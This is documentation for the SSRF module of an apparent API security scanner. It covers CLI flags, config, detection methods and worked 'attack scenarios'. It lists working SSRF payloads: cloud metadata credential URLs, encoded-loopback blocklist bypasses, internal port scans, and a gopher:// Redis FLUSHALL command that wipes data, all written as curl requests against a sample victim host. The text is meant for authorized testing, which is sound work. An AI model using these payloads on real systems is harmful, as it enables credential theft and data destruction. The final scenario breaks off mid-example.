# SSRF Testing (API7)

The SSRF Testing Module detects **OWASP API7 - Server-Side Request Forgery** vulnerabilities: cases where an API can be tricked into making outbound requests to internal infrastructure, cloud metadata endpoints, or external systems controlled by an attacker.

The module runs in isolation as `apileaks owasp ssrf --target URL` (the recommended focused red-team invocation) or as part of an orchestrated `scan` run, where it is included by default or selected with `--modules ssrf`. This page documents the module itself and every SSRF-specific command-line option, each with a title, a description, and an example.

> **Note:** `full` and `main` are deprecated, hidden aliases of `scan` (still functional, but they emit a stderr notice). `full --modules ssrf` is now `apileaks owasp ssrf`.

## 📋 Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [Enable the module (`--modules ssrf`)](#enable-the-module---modules-ssrf)
  - [Safe Mode (`--safe-mode`)](#safe-mode---safe-mode)
  - [OOB callback URL (`--ssrf-callback-url`)](#oob-callback-url---ssrf-callback-url)
  - [Additional internal targets (`--ssrf-internal-targets`)](#additional-internal-targets---ssrf-internal-targets)
  - [Additional URL schemes (`--ssrf-schemes`)](#additional-url-schemes---ssrf-schemes)
  - [Port scanning (`--ssrf-scan-ports`)](#port-scanning---ssrf-scan-ports)
  - [JSON body injection (`--ssrf-body-injection`)](#json-body-injection---ssrf-body-injection)
  - [Forced body injection methods (`--ssrf-body-methods`)](#forced-body-injection-methods---ssrf-body-methods)
  - [Aggressive mode (`--allow-aggressive-ssrf`)](#aggressive-mode---allow-aggressive-ssrf)
  - [Burp Suite XML import (`--burp-xml`)](#burp-suite-xml-import---burp-xml)
  - [HAR file import (`--har`)](#har-file-import---har)
  - [Explicit body field (`--ssrf-body-field`)](#explicit-body-field---ssrf-body-field)
- [Import Sources & Full Replay Mode](#import-sources--full-replay-mode)
- [Configuration (YAML)](#configuration-yaml)
- [Detection Techniques](#detection-techniques)
- [Injection Points](#injection-points)
- [Attack Scenarios](#-attack-scenarios)
- [Finding Categories](#finding-categories)
- [Safe Mode Interaction Matrix](#safe-mode-interaction-matrix)
- [Remediation](#remediation)

## 🎯 Overview

SSRF vulnerabilities occur when an API accepts a user-supplied URL and fetches it server-side without validating that the destination is an authorized external host. Attackers exploit this to reach internal services, cloud instance-metadata endpoints (which expose IAM credentials), and arbitrary internal ports — all from outside the network perimeter.

Key behaviors of the module:

- **Read-only by default.** In the absence of `--ssrf-body-injection` and `--allow-aggressive-ssrf`, the module restricts itself to query-parameter and header injection on any endpoint method. No JSON body probes, no port scans, no redirect-chain probes are issued.
- **Safe Mode compatible.** When `--safe-mode` is active the module skips all POST/PUT/PATCH/DELETE endpoints entirely and suppresses body injection and port-scan probes, ensuring no state-changing request is ever issued.
- **Cloud metadata coverage.** Five cloud providers are probed with provider-specific headers (GCP `Metadata-Flavor: Google`, Azure `Metadata: true`) to maximize detection fidelity on hosted infrastructure.
- **Deduplication.** At most one finding per `(endpoint, category, logical_target)` tuple is emitted per scan run. Subsequent duplicate payloads are merged into the existing finding's `payload` field.

## 🚀 Quick Start

```bash
# Minimal scan — query param + header injection only (no body probes)
python apileaks.py owasp ssrf --target https://api.example.com

# Body injection on all endpoints — the most common real-world attack vector.
# Use --ssrf-body-methods to force POST probes regardless of what discovery saw.
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST,PUT,PATCH

# Full red-team scan: body injection + blind OOB + bypass encodings + port scan
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST,PUT,PATCH \
  --ssrf-callback-url https://xyz.interact.sh \
  --allow-aggressive-ssrf \
  --ssrf-scan-ports 22,80,443,8080,8443,3306,5432,6379,27017

# Feed real observed traffic from a Burp Suite XML export (Full Replay Mode)
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --burp-xml ~/burp_proxy_history.xml

# Feed a HAR file captured in Chrome DevTools or Caido (Full Replay Mode)
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --har ~/traffic.har

# Combine both import sources and force-probe an extra field
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --burp-xml ~/burp.xml \
  --ssrf-body-field avatarUrl \
  --ssrf-callback-url https://xyz.interact.sh

# SSRF alongside other modules in an orchestrated scan
python apileaks.py scan \
  --target https://api.example.com \
  --modules ssrf,auth,bola
```

## 📖 Command Reference

All SSRF options are supplied to `apileaks owasp ssrf` (single-module) or to `scan` when running SSRF alongside other modules. The following options control SSRF behavior directly.

**Options at a glance:**

| Option | What it controls |
|--------|------------------|
| `--modules ssrf` | Enable the SSRF module |
| `--safe-mode` | Restrict to non-state-changing methods; skip body/port/redirect probes |
| `--ssrf-callback-url URL` | OOB listener URL for blind SSRF detection |
| `--ssrf-internal-targets HOST` | Add extra internal hosts/IPs to probe (repeatable) |
| `--ssrf-schemes SCHEME` | Add extra URL schemes to test (repeatable) |
| `--ssrf-scan-ports PORTS` | Comma-separated ports for internal port scanning |
| `--ssrf-body-injection` | Inject payloads into JSON request body fields on POST/PUT/PATCH |
| `--ssrf-body-methods METHODS` | Force body injection with specific HTTP methods (e.g. `POST,PUT`) regardless of what the discovery engine recorded for the endpoint |
| `--allow-aggressive-ssrf` | Enable port scanning and redirect-chain probes |
| `--burp-xml PATH` | Feed a Burp Suite Proxy History XML export into the module (Full_Replay_Mode) |
| `--har PATH` | Feed a HAR file (Burp, Caido, Chrome DevTools, Firefox) into the module (Full_Replay_Mode) |
| `--ssrf-body-field FIELD` | Explicitly name a JSON body field to always probe (repeatable, additive) |

### Enable the module (`--modules ssrf`)

**Description.** Selects the SSRF module. Run it in isolation with `apileaks owasp ssrf`, or include it in an orchestrated `scan` via `--modules`. With no SSRF-specific flags, the module runs in its safe, read-only default mode: query-parameter and header injection only, no body probes, no port scans.

**Example:**

```bash
# SSRF only (isolated single-module run)
python apileaks.py owasp ssrf --target https://api.example.com

# SSRF alongside BOLA and Auth (orchestrated scan)
python apileaks.py scan --target https://api.example.com --modules ssrf,bola,auth
```

### Safe Mode (`--safe-mode`)

**Description.** Enables Safe Mode globally. With Safe Mode on the SSRF module:
- Skips all endpoints whose HTTP method is POST, PUT, PATCH, or DELETE.
- Skips all JSON body injection probes even when `--ssrf-body-injection` is set.
- Skips all port-scanning probes even when `--allow-aggressive-ssrf` and `--ssrf-scan-ports` are set.
- Skips all redirect-chain probes.
- Still issues query-parameter and header injection probes on GET/HEAD endpoints.

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --safe-mode
```

### OOB callback URL (`--ssrf-callback-url`)

**Description.** Supplies an operator-controlled out-of-band (OOB) listener URL for blind SSRF detection. The module injects this URL into every injection point (query params, headers, and — when body injection is enabled — JSON body fields) and emits an `SSRF_BLIND` (CRITICAL) finding when the server returns a 2xx response without reflecting any internal-target signatures, indicating it may have fetched the URL. The operator must independently verify the hit on their OOB listener (e.g. Burp Collaborator, Interactsh).

When this option is omitted, blind SSRF probes are not issued.

**Example:**

```bash
# Using Interactsh or Burp Collaborator as the OOB listener
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-callback-url https://xyz.interact.sh
```

### Additional internal targets (`--ssrf-internal-targets`)

**Description.** Adds extra internal hostnames or IP addresses to the built-in probe set. The option is **repeatable** — pass it once per host. Provided hosts are merged with `additional_internal_targets` (no duplicates). These supplement the built-in set; they do not replace it.

Built-in targets include: `127.0.0.1`, `localhost`, `169.254.169.254`, `metadata.google.internal`, plus the five cloud-provider metadata paths (AWS IMDSv1, GCP, Azure, DigitalOcean, Oracle Cloud).

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-internal-targets 10.0.0.1 \
  --ssrf-internal-targets 172.16.0.1 \
  --ssrf-internal-targets internal-db.corp
```

### Additional URL schemes (`--ssrf-schemes`)

**Description.** Adds extra dangerous URL schemes to test beyond the built-in list (`file://`, `ftp://`, `gopher://`, `dict://`, `sftp://`, `ldap://`). The option is **repeatable**. These are injected into query parameters and headers alongside the built-in schemes.

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-schemes tftp:// \
  --ssrf-schemes redis://
```

### Port scanning (`--ssrf-scan-ports`)

**Description.** Comma-separated list of internal ports to probe via SSRF (e.g. `22,80,443,8080`). Payloads of the form `http://127.0.0.1:{PORT}/` are injected into query parameters. Port scanning requires `--allow-aggressive-ssrf` to be set; providing `--ssrf-scan-ports` without it emits a non-terminating stderr warning and has no effect.

When this option is omitted, no port-scanning probes are issued regardless of `--allow-aggressive-ssrf`.

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --allow-aggressive-ssrf \
  --ssrf-scan-ports 22,80,443,8080,8443,3306,5432,6379,27017
```

### JSON body injection (`--ssrf-body-injection`)

**Description.** Enables SSRF payload injection into JSON request body fields on POST, PUT, and PATCH endpoints. The module injects every internal target and scheme payload into 15 commonly vulnerable field names: `url`, `uri`, `target`, `webhook`, `callback`, `imageUrl`, `avatarUrl`, `feedUrl`, `importUrl`, `source`, `endpoint`, `api`, `service`, `host`, `destination`. Each probe uses `Content-Type: application/json`. Suppressed automatically when `--safe-mode` is active.

The module uses the HTTP method the discovery engine recorded for the endpoint. If the endpoint was only seen as `GET` during discovery (even though it also accepts POST with a URL in the body), body injection won't fire unless you also pass `--ssrf-body-methods`.

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-injection
```

### Forced body injection methods (`--ssrf-body-methods`)

**Description.** The most important flag for real-world SSRF. Comma-separated list of HTTP methods to force for all body injection probes, overriding whatever method the discovery engine saw for the endpoint. This solves the most common real-world gap: an API accepts a URL in a JSON body on a POST endpoint (`{"image_url": "...", "webhook": "..."}`) but the discovery engine only exercised it as GET, so body injection would silently be skipped.

When `--ssrf-body-methods` is provided, `--ssrf-body-injection` is implied automatically (you don't need both flags).

```
POST /api/v1/user/profile-picture   ← discovery only saw GET
{"image_url": "http://evil.com"}    ← body injection never runs
```

With `--ssrf-body-methods POST`, the module explicitly sends POST requests to every endpoint with all 15 body field payloads, regardless of how discovery catalogued them.

**Example:**

```bash
# Force POST body injection on all endpoints (even those discovered as GET)
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST

# Force all three body-carrying methods
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST,PUT,PATCH

# Real-world attack scenario — profile picture / webhook endpoint
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST \
  --ssrf-callback-url https://xyz.interact.sh

# Equivalent curl commands the module generates internally:
# curl -X POST https://api.example.com/v1/profile-picture \
#   -H "Content-Type: application/json" \
#   -d '{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
#
# curl -X POST https://api.example.com/v1/profile-picture \
#   -H "Content-Type: application/json" \
#   -d '{"url": "http://2130706433/"}' ← decimal bypass for 127.0.0.1
```

### Aggressive mode (`--allow-aggressive-ssrf`)

**Description.** The aggressive opt-in. Unlocks two high-impact probe types that are suppressed by default:

1. **Internal port scanning** — requires `--ssrf-scan-ports` to list target ports.
2. **Redirect-chain probes** — tests credentials-prefix (`http://target@external/`) and query-redirect (`http://external/?next=http://target/`) payloads against every internal target via query params and headers.

Both probe types are skipped when `--safe-mode` is active even if `--allow-aggressive-ssrf` is set.

**Example:**

```bash
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --allow-aggressive-ssrf \
  --ssrf-scan-ports 80,443,8080,8443,3306
```

### Burp Suite XML import (`--burp-xml`)

**Description.** Feeds a Burp Suite Proxy History XML export into the SSRF module. The file is parsed before any probes are issued — a missing or malformed file raises an error immediately with a descriptive message. Each `<item>` element in the XML produces one replay request. The `<request>` content is base64-decoded when the `base64="true"` attribute is present, or used as-is otherwise. Only requests with a `Content-Type: application/json` body that parses as a JSON object are eligible for body injection; non-JSON requests are skipped silently.

Requests are probed in **Full Replay Mode**: the complete original header set (including `Authorization`, `Cookie`, and any custom headers) is used as the base for every probe, and only URL-like body field values are replaced with SSRF payloads. All other body fields keep their original values. Passing `--burp-xml` automatically enables body injection — you do not need to also pass `--ssrf-body-injection`.

Malformed `<item>` elements (missing `<request>`, corrupt base64) are logged as warnings and skipped without aborting the remaining items.

**Example:**

```bash
# Replay all Burp-captured requests with SSRF probes, using original auth headers
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --burp-xml ~/burp_proxy_history.xml

# Combine with blind OOB detection
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --burp-xml ~/burp_proxy_history.xml \
  --ssrf-callback-url https://xyz.interact.sh
```

### HAR file import (`--har`)

**Description.** Feeds a HAR (HTTP Archive) JSON file into the SSRF module. HAR files can be exported from Burp Suite Logger, Caido, Hetty, Chrome DevTools, or Firefox. Each entry in `log.entries[].request` becomes one replay request. The path is extracted as path + query string only (scheme and host are stripped). A missing file or invalid JSON raises an `ImportSourceError` immediately. An absent or empty `log.entries` is silently treated as zero requests.

Like `--burp-xml`, replay uses **Full Replay Mode** and automatically enables body injection.

Malformed HAR entries are logged as warnings and skipped.

**Example:**

```bash
# Feed a HAR captured in Chrome DevTools
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --har ~/devtools_export.har

# Feed a Caido HAR export and add an explicit extra body field
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --har ~/caido_traffic.har \
  --ssrf-body-field avatarUrl

# Both import sources at once
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --burp-xml ~/burp.xml \
  --har ~/caido.har
```

### Explicit body field (`--ssrf-body-field`)

**Description.** Names an additional JSON body field that should always be probed with SSRF payloads, regardless of what auto-detection or import sources identify. The option is **repeatable** — pass it once per field. Provided field names are merged into the resolved body field set at the **highest priority**, so they are always included even if the spec, the import source, or the generic fallback list would not have included them.

`--ssrf-body-field` is **additive** — it never replaces the fields auto-detected from Burp XML / HAR sources or the generic `JSON_BODY_FIELDS` fallback. When used together with `--burp-xml` or `--har`, both the explicit fields and the import-source-detected fields are probed.

When `--ssrf-body-field` is the only import-source-related flag (no `--burp-xml` / `--har`), it adds the named fields to all endpoints without activating Full Replay Mode.

**Body field priority (highest → lowest):**

```
--ssrf-body-field values        (always included, highest priority)
  ↓
Burp XML / HAR auto-detected URL-like fields
  ↓
OpenAPI / Swagger spec fields
  ↓
JSON_BODY_FIELDS generic fallback
```

Duplicates across sources are deduplicated, with the highest-priority occurrence winning.

**Example:**

```bash
# Always probe 'internalEndpoint' and 'proxyUrl' in addition to auto-detected fields
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --ssrf-body-methods POST \
  --ssrf-body-field internalEndpoint \
  --ssrf-body-field proxyUrl

# Combine with HAR import — both sources are additive
python apileaks.py owasp ssrf \
  --target https://api.example.com \
  --har ~/traffic.har \
  --ssrf-body-field customUrlField
```

## 🗂️ Import Sources & Full Replay Mode

The module supports three new input sources that feed real observed traffic into body injection probes. All parsing lives in `utils/import_sources.py`.

### How Full Replay Mode works

When a request is loaded from `--burp-xml` or `--har`:

1. **Original headers are preserved** — `Authorization`, `Cookie`, and every custom header from the captured request become the base header set for each probe. The module does not strip or replace auth context; what was captured is what gets replayed.
2. **Body is replayed in full** — the complete original body is used as the base. Only fields classified as URL-like have their values replaced by SSRF payloads. All other fields keep their original values, including non-URL strings, integers, and nested objects.
3. **Probe URL = `--target` base URL + imported path** — the scheme and host from the captured URL are discarded; only the path and query string are combined with the `--target` you supply at the CLI. This means you can capture traffic against production and replay it against staging without any manual editing.
4. **Safe Mode applies** — when `--safe-mode` is active, Full Replay Mode skips state-changing methods (POST, PUT, PATCH, DELETE) imported from the file, consistent with the global safe mode behavior.

### URL-like field auto-detection

A body field is classified as URL-like — and therefore eligible for SSRF payload injection — when either of the following is true:

- Its **name** (case-insensitive) contains any of the URL_Like_Keywords: `url`, `uri`, `host`, `endpoint`, `target`, `webhook`, `callback`, `redirect`, `link`, `href`, `src`, `source`, `dest`, `destination`, `fetch`, `import`, `feed`, `avatar`, `image`, `thumbnail`, `imageUrl`, `avatarUrl`, `feedUrl`, `importUrl`.
- Its **string value** starts with `http://` or `https://` (case-insensitive), regardless of field name.

When both rules match the same field, the field is included exactly once in the probe set.

### Supported import formats

| Format | CLI flag | Exported from |
|--------|----------|---------------|
| Burp Suite XML | `--burp-xml PATH` | Burp Proxy → HTTP History → Save items (XML) |
| HAR JSON | `--har PATH` | Burp Suite Logger, Caido, Hetty, Chrome DevTools, Firefox |

### Error handling

| Condition | Behavior |
|-----------|----------|
| File does not exist | `ImportSourceError` raised immediately, before any probes |
| Burp XML is not valid XML | `ImportSourceError` raised immediately |
| HAR file is not valid JSON or missing `log` key | `ImportSourceError` raised immediately |
| Single malformed `<item>` or HAR entry | Warning logged, item skipped, rest continues |
| Non-JSON body in an imported request | `body` set to `None`; request skipped for body injection |

### Example: targeting an endpoint with auth-dependent SSRF

```bash
# 1. Capture authenticated requests in Burp Suite Proxy History.
# 2. Export: Proxy → HTTP History → select all → right-click → Save items.
# 3. Replay against staging with SSRF probes, preserving all auth headers:
python apileaks.py owasp ssrf \
  --target https://staging-api.example.com \
  --burp-xml ~/burp_history.xml \
  --ssrf-callback-url https://xyz.interact.sh

# The module will:
#  • Parse every <item> in the XML
#  • Auto-detect URL-like body fields (imageUrl, webhook, callback, etc.)
#  • Replay each request with original Authorization/Cookie headers
#  • Replace only URL-like field values with SSRF payloads
#  • Emit findings for any that returns 2xx or matches an internal-target signature
```



SSRF options can also be set under `owasp_testing.ssrf_testing`. All fields have safe defaults, so an existing configuration that omits them loads unchanged and resolves to read-only behavior.

```yaml
owasp_testing:
  enabled_modules: ["ssrf"]

  ssrf_testing:
    enabled: true

    # Built-in internal targets (always probed)
    internal_targets:
      - "127.0.0.1"
      - "localhost"
      - "169.254.169.254"
      - "metadata.google.internal"

    # Authoritative safe-mode flag (usually set globally via --safe-mode)
    safe_mode: false

    # OOB callback URL for blind SSRF detection (null = disabled)
    callback_url: null

    # Extra internal hosts to probe in addition to the built-ins
    additional_internal_targets: []

    # Extra URL schemes to test in addition to the built-ins
    additional_schemes: []

    # Gate for port-scan and redirect-chain probes
    allow_port_scan: false

    # Ports to probe when allow_port_scan is true
    scan_ports:
      - 22
      - 80
      - 443
      - 8080
      - 8443
      - 3306
      - 5432
      - 6379
      - 27017

    # Enable IP-encoding bypass payload generation
    bypass_encodings: true

    # Enable JSON body injection on POST/PUT/PATCH
    body_injection: false

    # Force these HTTP methods for body injection probes regardless of what
    # the discovery engine recorded for each endpoint (empty = use endpoint's method)
    body_injection_methods: []

    # Path to a Burp Suite Proxy History XML export (null = disabled)
    burp_xml_path: null

    # Path to a HAR (HTTP Archive) JSON file (null = disabled)
    har_path: null

    # Extra body field names to always probe regardless of auto-detection
    extra_body_fields: []
```

| Field | CLI equivalent | Default | Purpose |
|-------|----------------|---------|---------|
| `safe_mode` | `--safe-mode` | `false` | Restrict to safe methods; skip body/port/redirect probes |
| `callback_url` | `--ssrf-callback-url` | `null` | OOB listener URL for blind SSRF |
| `additional_internal_targets` | `--ssrf-internal-targets` | `[]` | Extra hosts to probe |
| `additional_schemes` | `--ssrf-schemes` | `[]` | Extra URL schemes to test |
| `allow_port_scan` | `--allow-aggressive-ssrf` | `false` | Gate for port scan + redirect-chain |
| `scan_ports` | `--ssrf-scan-ports` | 9 common ports | Ports to probe internally |
| `bypass_encodings` | — | `true` | Generate IP-encoding bypass payloads |
| `body_injection` | `--ssrf-body-injection` | `false` | Inject into JSON body fields |
| `body_injection_methods` | `--ssrf-body-methods` | `[]` | Force these HTTP methods for body probes, overriding discovery |
| `burp_xml_path` | `--burp-xml` | `null` | Path to Burp Suite XML export; activates Full Replay Mode |
| `har_path` | `--har` | `null` | Path to HAR JSON file; activates Full Replay Mode |
| `extra_body_fields` | `--ssrf-body-field` | `[]` | Additional body field names to always probe (highest priority) |

## 🔍 Detection Techniques

### 1. Query parameter injection

SSRF payloads are injected into the following query parameter names on every endpoint, regardless of HTTP method (subject to safe-mode method restrictions):

```
url, uri, target, dest, redirect, host
```

### 2. Header injection

SSRF payloads are injected into the following HTTP headers on every endpoint:

```
X-Forwarded-For, Referer, X-Forwarded-Host, X-Forwarded-Proto
```

### 3. JSON body injection (opt-in)

> **⚠️ Important — discovery gap**: The module uses the HTTP method the discovery engine recorded for each endpoint. If discovery only exercised `GET /api/v1/profile-picture`, body injection silently skips it even though the endpoint accepts `POST {"image_url": "..."}`. **Always use `--ssrf-body-methods POST` (or `POST,PUT,PATCH`) to force body probes on all endpoints regardless of what discovery saw.** This is the most common SSRF attack surface in real-world APIs and the most commonly missed.

When body injection is enabled (via `--ssrf-body-injection` or `--ssrf-body-methods`), payloads are sent as single-key JSON bodies `{"field_name": payload}` with `Content-Type: application/json` for each of the 15 field names:

```
url, uri, target, webhook, callback, imageUrl, avatarUrl,
feedUrl, importUrl, source, endpoint, api, service, host, destination
```

The module generates one probe per `(field_name × internal_target)` combination. For a target with 4 internal targets + 5 cloud metadata probes + 7 bypass encodings = 16 internal probes × 15 fields = 240 POST requests per endpoint. This covers the real-world patterns:

```http
POST /api/v1/user/profile-picture
Content-Type: application/json

{"imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

```http
POST /api/v2/tools/validate-url
Content-Type: application/json

{"endpoint": "http://2130706433/"}         ← decimal-encoded 127.0.0.1 (bypass)
```

```http
POST /api/v1/webhook
Content-Type: application/json

{"callback": "gopher://127.0.0.1:6379/_FLUSHALL%0d%0a"}   ← scheme smuggling
```

### 4. Cloud metadata probes

Five cloud-provider instance-metadata endpoints are probed with their required headers:

| Provider | URL | Required header |
|----------|-----|-----------------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | — |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/` | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| DigitalOcean | `http://169.254.169.254/metadata/v1` | — |
| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` | — |

### 5. IP-encoding bypass payloads

When `bypass_encodings` is `true` (the default), seven bypass-encoded loopback variants are generated to evade naive blocklists:

| Encoding | Payload |
|----------|---------|
| Decimal | `http://2130706433/` |
| Octal | `http://0177.0.0.1/` |
| Hexadecimal | `http://0x7f000001/` |
| IPv6 short | `http://[::1]/` |
| IPv6 full | `http://[0:0:0:0:0:ffff:127.0.0.1]/` |
| Zero IP | `http://0.0.0.0/` |
| Credentials prefix | `http://user@127.0.0.1/` |

A bypass probe that matches an internal-target signature or returns a 2xx response emits `SSRF_SCHEME_BYPASS` (HIGH), not `SSRF_INTERNAL_ACCESS`, so blocklist-evasion findings are clearly distinguishable in reports.

### 6. URL scheme bypass payloads

The following dangerous URL schemes are injected as scheme-based probes:

```
file://, ftp://, gopher://, dict://, sftp://, ldap://
```

A scheme probe that returns any non-error response (status < 500) emits `SSRF_SCHEME_BYPASS` (HIGH). A scheme probe whose response body matches file-system content signatures (e.g. `/etc/passwd` markers) emits `FILE_PROTOCOL_ACCESS` (CRITICAL).

### 7. Out-of-band (blind) SSRF detection

When `--ssrf-callback-url` is set, the callback URL is injected into every query parameter, SSRF-prone header, and (when enabled) JSON body field. A 2xx response with no internal-target signature in the body triggers an `SSRF_BLIND` (CRITICAL) finding. The operator must verify the callback hit on their OOB listener independently.

### 8. Internal port scanning (aggressive)

When `--allow-aggressive-ssrf` and `--ssrf-scan-ports` are both set, the module probes each listed port via `http://127.0.0.1:{PORT}/` injected into query parameters. Open ports are detected by two signals:
- Response status outside the 4xx range (`< 400` or `>= 500`)
- Response time more than 2,000 ms faster than the median across all port probes

### 9. Redirect-chain probes (aggressive)

When `--allow-aggressive-ssrf` is set, two redirect-chain payload variants are tested per internal target:
- **Credentials-prefix**: `http://{target}@external.ssrf.test/`
- **Query-redirect**: `http://external.ssrf.test/?next=http://{target}/`

A response that matches internal-target signatures emits `SSRF_INTERNAL_ACCESS` (CRITICAL) with evidence naming the redirect-chain technique.

## 🧲 Injection Points

The SSRF module covers three injection surfaces automatically:

```
Query params ──► url, uri, target, dest, redirect, host
Headers      ──► X-Forwarded-For, Referer, X-Forwarded-Host, X-Forwarded-Proto
JSON body    ──► url, uri, target, webhook, callback, imageUrl, avatarUrl,
(opt-in)         feedUrl, importUrl, source, endpoint, api, service, host, destination

Import sources (Full Replay Mode):
  ──► All URL-like fields auto-detected from imported request body
  ──► Plus any --ssrf-body-field explicit names
  ──► All with original headers (auth/cookies) preserved
```

Every finding's `evidence` field identifies the injection point type (`query`, `header`, or `body`) and the specific parameter/header/field name used.

## 🎯 Attack Scenarios

Each scenario shows the exact `curl` equivalent of what the module sends, so you can reproduce findings manually or understand exactly what is being tested.

### Level 1 — Classic SSRF (loopback / internal network access)

The API accepts a URL for a server-side action (fetch avatar, validate link, generate PDF). No validation. The module sends this for every URL-accepting body field via `--ssrf-body-methods POST`:

```bash
# What the module sends automatically
curl -X POST https://api.victima.com/v1/fetch-avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -d '{"url": "http://127.0.0.1:9000/admin/status"}'

curl -X POST https://api.victima.com/v1/fetch-avatar \
  -H "Content-Type: application/json" \
  -d '{"imageUrl": "http://192.168.1.1/index.html"}'
```

**apileaks command:**
```bash
python apileaks.py owasp ssrf \
  --target https://api.victima.com \
  --ssrf-body-methods POST \
  --ssrf-internal-targets 192.168.1.1
```

---

### Level 2 — Cloud metadata credential theft (AWS/GCP/Azure)

The five cloud metadata probes run automatically. No extra flags needed — they are part of the built-in probe set. With `--ssrf-body-methods POST` they also hit JSON body fields:

```bash
# AWS IMDSv1 — no token required on legacy configurations
curl -X POST https://api.victima.com/v2/parse-webhook \
  -H "Content-Type: application/json" \
  -d '{"endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/backend-api-role"}'

# GCP — module sends the required Metadata-Flavor header automatically
curl -X POST https://api.victima.com/v2/parse-webhook \
  -H "Content-Type: application/json" \
  -H "Metadata-Flavor: Google" \
  -d '{"target_url": "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true"}'
```

**apileaks command:**
```bash
python apileaks.py owasp ssrf \
  --target https://api.victima.com \
  --ssrf-body-methods POST
# GCP header is injected automatically for the metadata.google.internal probe
```

**Finding emitted:** `SSRF_CLOUD_METADATA` (CRITICAL) with the matched signature (e.g. `iam/security-credentials`, `access_token`, `computeMetadata`).

---

### Level 3 — Blocklist bypass (IP encoding evasion)

Developers implement a regex blocklist for `localhost`, `127.0.0.1`, `169.254.169.254`. The module generates all seven bypass encodings automatically (controlled by `bypass_encodings: true`, the default):

```bash
# Decimal encoding — 127.0.0.1 → 2130706433
curl -X POST https://api.victima.com/v3/verify-link \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433:8080"}'

# Hex encoding
curl -X POST https://api.victima.com/v3/verify-link \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0x7f000001/"}'

# IPv6 loopback
curl -X POST https://api.victima.com/v3/verify-link \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]/"}'

# Credentials-prefix confusion (parser-dependent)
curl -X POST https://api.victima.com/v3/verify-link \
  -H "Content-Type: application/json" \
  -d '{"url": "http://user@127.0.0.1/"}'
```

**apileaks command:**
```bash
python apileaks.py owasp ssrf \
  --target https://api.victima.com \
  --ssrf-body-methods POST,PUT,PATCH
# bypass_encodings is true by default — all 7 variants are generated automatically
```

**Finding emitted:** `SSRF_SCHEME_BYPASS` (HIGH) — distinguishable from plain `SSRF_INTERNAL_ACCESS` so you know the blocklist was bypassed, not absent.

---

### Level 4 — Blind SSRF (OOB callback) + protocol smuggling

The server fetches the URL but never returns the content. Combine `--ssrf-callback-url` with `--ssrf-body-methods` to cover all injection points including body fields. For protocol smuggling via `gopher://`, the built-in scheme probes handle it automatically:

```bash
# Blind SSRF — check your Interactsh/Burp Collaborator listener for incoming requests
curl -X POST https://api.victima.com/v1/fetch-avatar \
  -H "Content-Type: application/json" \
  -d '{"callback": "https://xyz.interact.sh/blind-ssrf-check"}'

# Gopher protocol smuggling to Redis (scheme probe, runs automatically)
curl -X POST https://api.victima.com/v1/fetch-avatar \
  -H "Content-Type: application/json" \
  -d '{"source_url": "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20key%20value%0d%0aQUIT"}'
```

**apileaks command:**
```bash
python apileaks.py owasp ssrf \
  --target https://api.victima.com \
  --ssrf-body-methods POST,PUT,PATCH \
  --ssrf-callback-url https://xyz.interact.sh \
  --allow-aggressive-ssrf \
  --ssrf-scan-ports 6379,27017,5432,3306,8080,9200
```

**Findings emitted:**
- `SSRF_BLIND` (CRITICAL) — 2xx response to OOB callback probe with no reflected content
- `SSRF_SCHEME_BYPASS` (HIGH) — `gopher://` or `dict://` returned non-error status
- `SSRF_PORT_SCAN` (MEDIUM) — internal port responded faster than the timeout median

---

### Level 5 — Import-source Full Replay (Burp XML / HAR)

You have a Burp Suite or Caido capture of authenticated requests hitting `/api/v1/profile-picture` and `/api/v2/webhook`. Rather than guessing which fields exist and re-supplying auth tokens manually, feed the export directly:

```bash
# Burp Suite XML export
python apileaks.py owasp ssrf \
  --target https://staging-api.victima.com \
  --burp-xml ~/burp_history.xml \
  --ssrf-callback-url https://xyz.interact.sh

# What the module does internally for each imported JSON request:
# 1. Parse: method=POST, path=/api/v1/profile-picture
#           headers={Authorization: Bearer <orig_token>, Cookie: session=<orig_cookie>}
#           body={imageUrl: "https://cdn.example.com/img.jpg", name: "Alice"}
#
# 2. Auto-detect URL-like fields: ["imageUrl"]   ← name keyword match
#
# 3. For each probe payload (internal targets + bypass encodings + OOB callback):
#    POST https://staging-api.victima.com/api/v1/profile-picture
#    Authorization: Bearer <orig_token>
